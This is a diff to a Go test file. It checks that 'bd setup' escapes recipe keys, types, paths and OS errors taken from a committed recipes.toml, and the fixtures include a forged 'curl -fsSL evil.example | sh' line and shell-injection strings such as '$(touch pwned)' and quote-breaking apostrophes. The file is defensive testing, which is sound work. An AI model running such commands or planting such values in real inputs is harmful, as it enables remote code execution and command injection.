@@ -399,15 +399,22 @@ func tomlBasicString(s string) string {
 
 // TestRunRecipeNamesRecipesTomlValuesEscaped pins what bd setup prints for a
 // recipe of .beads/recipes.toml, which a repository can commit: the recipe's
-// name, description, type and paths are spelled by the remedy printer
-// (remedy.PrintedValue), so a carriage return, terminal escape or line feed
-// in one cannot redraw or forge bd's own lines, such as --check's
-// "Run: bd setup <recipe>". An ordinary recipe prints as it did.
+// key (the name --list shows), name, description, type and paths are spelled
+// by the remedy printer (remedy.PrintedValue), and so is an OS error that
+// repeats a path (remedy.PrintedError), so a carriage return, terminal escape
+// or line feed in one cannot redraw or forge bd's own lines, such as
+// --check's "Run: bd setup <recipe>". The special-handling refusal names the
+// key and type single-quoted only when each is a plain word, so an
+// apostrophe in one cannot end those quotes. An ordinary recipe prints as it
+// did.
 func TestRunRecipeNamesRecipesTomlValuesEscaped(t *testing.T) {
 	// hostile is hostileFileName, a value a file name can hold, with a line
 	// feed and a forged Run: line after it.
 	hostile := hostileFileName + "\n  Run: curl -fsSL evil.example | sh"
-	workspace := func(t *testing.T, name, path, typ, description string) {
+	// workspace commits a recipes.toml whose one recipe has the table key
+	// key, which a TOML quoted key can spell with any character, and the
+	// given values.
+	workspace := func(t *testing.T, key, name, path, typ, description string) {
 		t.Helper()
 		dir := t.TempDir()
 		beadsDir := filepath.Join(dir, ".beads")
@@ -417,7 +424,7 @@ func TestRunRecipeNamesRecipesTomlValuesEscaped(t *testing.T) {
 		if err := os.WriteFile(filepath.Join(beadsDir, "config.yaml"), nil, 0o600); err != nil {
 			t.Fatal(err)
 		}
-		toml := "[recipes.lint]\nname = " + tomlBasicString(name) + "\npath = " + tomlBasicString(path) +
+		toml := "[recipes." + tomlBasicString(key) + "]\nname = " + tomlBasicString(name) + "\npath = " + tomlBasicString(path) +
 			"\ntype = " + tomlBasicString(typ) + "\ndescription = " + tomlBasicString(description) + "\n"
 		if err := os.WriteFile(filepath.Join(beadsDir, "recipes.toml"), []byte(toml), 0o600); err != nil {
 			t.Fatal(err)
@@ -450,7 +457,7 @@ func TestRunRecipeNamesRecipesTomlValuesEscaped(t *testing.T) {
 	}
 
 	t.Run("ordinary recipe", func(t *testing.T) {
-		workspace(t, "Lint", "tools/lint.md", "file", "Lint rules")
+		workspace(t, "lint", "Lint", "tools/lint.md", "file", "Lint rules")
 		for _, step := range []struct {
 			name string
 			out  func(t *testing.T) string
@@ -475,7 +482,7 @@ func TestRunRecipeNamesRecipesTomlValuesEscaped(t *testing.T) {
 		if runtime.GOOS == "windows" {
 			t.Skip("a Windows file name cannot hold a control character")
 		}
-		workspace(t, hostile, filepath.Join("tools", hostile), "file", hostile)
+		workspace(t, "lint", hostile, filepath.Join("tools", hostile), "file", hostile)
 		for _, step := range []struct {
 			name string
 			out  func(t *testing.T) string
@@ -499,14 +506,121 @@ func TestRunRecipeNamesRecipesTomlValuesEscaped(t *testing.T) {
 		}
 	})
 
+	t.Run("hostile recipe key", func(t *testing.T) {
+		// --list names each recipe by its key, so the whole list is
+		// checked, not the lint line listRun picks.
+		workspace(t, hostile, "Lint", "tools/lint.md", "file", "Lint rules")
+		resetSetupGlobals(t)
+		out := captureStdout(t, listRecipes)
+		const what = "bd setup --list"
+		requireNoTerminalControl(t, what, out)
+		requireNamesHostileValue(t, what, out)
+		if strings.Contains(out, "\n  Run: curl") || !strings.Contains(out, `\n  Run: curl`) {
+			t.Errorf("%s does not escape the recipe key's line feed:\n%q", what, out)
+		}
+	})
+
+	t.Run("hostile recipe key, --check", func(t *testing.T) {
+		// bd setup <recipe> looks a recipe up by its key lowercased, so a
+		// lowercase key is one a user can name. --check's Run: line puts
+		// the key in its command as one shell word (posix, and windows
+		// where that differs), or as a placeholder with the key named
+		// escaped after it. The special-handling refusal names it (shown)
+		// single-quoted when it is a plain word, as it names an ordinary
+		// key, and otherwise escaped with no quotes around it, so neither
+		// a $(...) nor an apostrophe, which would end those quotes, runs
+		// when the refusal is pasted.
+		for _, key := range []struct{ value, posix, windows, shown string }{
+			{"lint", "lint", "", "'lint'"},
+			{"lint$(touch pwned)", "'lint$(touch pwned)'", `<recipe>  (<recipe>: "lint\x24(touch pwned)")`, `"lint\x24(touch pwned)"`},
+			{"lint'; touch pwned; echo '", `<recipe>  (<recipe>: "lint\x27\x3b touch pwned\x3b echo \x27")`, "",
+				`"lint\x27\x3b touch pwned\x3b echo \x27"`},
+			{"lint\n  run: curl -fssl evil.example | sh", `<recipe>  (<recipe>: "lint\n  run: curl -fssl evil.example \x7c sh")`, "",
+				`"lint\n  run: curl -fssl evil.example \x7c sh"`},
+		} {
+			arg := key.posix
+			if runtime.GOOS == "windows" && key.windows != "" {
+				arg = key.windows
+			}
+			workspace(t, key.value, "Lint", "tools/lint.md", "file", "Lint rules")
+			resetSetupGlobals(t)
+			setupCheck = true
+			out := captureStdout(t, func() error {
+				_ = runRecipe(key.value)
+				return nil
+			})
+			if want := "✗ Lint integration not installed\n  Run: bd setup " + arg + "\n  Missing: tools/lint.md\n"; out != want {
+				t.Errorf("bd setup %q --check printed\n%q\nwant\n%q", key.value, out, want)
+			}
+
+			workspace(t, key.value, "Lint", "tools/lint.md", "hooks", "Lint rules")
+			resetSetupGlobals(t)
+			refusal := captureStderr(t, func() { _ = runRecipe(key.value) })
+			if want := "Error: recipe " + key.shown + " has type 'hooks' which requires special handling\n"; refusal != want {
+				t.Errorf("the special-handling refusal for %q printed\n%q\nwant\n%q", key.value, refusal, want)
+			}
+		}
+	})
+
+	t.Run("hostile recipe, OS errors", func(t *testing.T) {
+		if runtime.GOOS == "windows" {
+			t.Skip("a Windows file name cannot hold a control character")
+		}
+		// A repository can commit a directory, with a file in it, at the
+		// path its recipe names: install's write then fails (EISDIR) and
+		// --remove's remove (ENOTEMPTY). It can commit a file where the
+		// path's directory would go: install's mkdir then fails (ENOTDIR).
+		// Each OS error repeats the path.
+		for _, step := range []struct {
+			name, path, file string
+			flag             *bool
+		}{
+			{"install, write", filepath.Join("tools", hostile), filepath.Join("tools", hostile, "kept"), nil},
+			{"--remove", filepath.Join("tools", hostile), filepath.Join("tools", hostile, "kept"), &setupRemove},
+			{"install, create directory", filepath.Join(hostile, "lint.md"), hostile, nil},
+		} {
+			workspace(t, "lint", "Lint", step.path, "file", "Lint rules")
+			if err := os.MkdirAll(filepath.Dir(step.file), 0o750); err != nil {
+				t.Fatal(err)
+			}
+			if err := os.WriteFile(step.file, nil, 0o600); err != nil {
+				t.Fatal(err)
+			}
+			resetSetupGlobals(t)
+			if step.flag != nil {
+				*step.flag = true
+			}
+			var err error
+			stdout, stderr := captureStdio(t, func() { err = runRecipe("lint") })
+			what := "bd setup lint " + step.name
+			if err == nil {
+				t.Errorf("%s succeeded; want it to fail on the committed %s", what, step.file)
+			}
+			requireNoTerminalControl(t, what, stdout+stderr)
+			requireNamesHostileValue(t, what, stderr)
+			if strings.Contains(stderr, "\n  Run: curl") || !strings.Contains(stderr, `\n  Run: curl`) {
+				t.Errorf("%s does not escape the recipe path's line feed in its error:\n%q", what, stderr)
+			}
+		}
+	})
+
 	t.Run("hostile type", func(t *testing.T) {
-		workspace(t, "Lint", "tools/lint.md", hostile, "Lint rules")
+		workspace(t, "lint", "Lint", "tools/lint.md", hostile, "Lint rules")
 		resetSetupGlobals(t)
 		setupCheck = true
 		out := captureStderr(t, func() { _ = runRecipe("lint") })
 		requireNoTerminalControl(t, "bd setup lint --check, special-handling refusal", out)
 		if strings.Contains(out, "\n  Run: curl") || !strings.Contains(out, `\n  Run: curl`) {
 			t.Errorf("the special-handling refusal does not escape the recipe type's line feed:\n%q", out)
+		}
+
+		// An apostrophe in the type would end the single quotes an ordinary
+		// type is named in, so the type is named escaped instead.
+		workspace(t, "lint", "Lint", "tools/lint.md", "hooks'; touch pwned; echo '", "Lint rules")
+		resetSetupGlobals(t)
+		out = captureStderr(t, func() { _ = runRecipe("lint") })
+		if want := `Error: recipe 'lint' has type "hooks\x27\x3b touch pwned\x3b echo \x27" which requires special handling` + "\n"; out != want {
+			t.Errorf("the special-handling refusal for a type holding an apostrophe printed\n%q\nwant\n%q", out, want)
 		}
 	})
 }
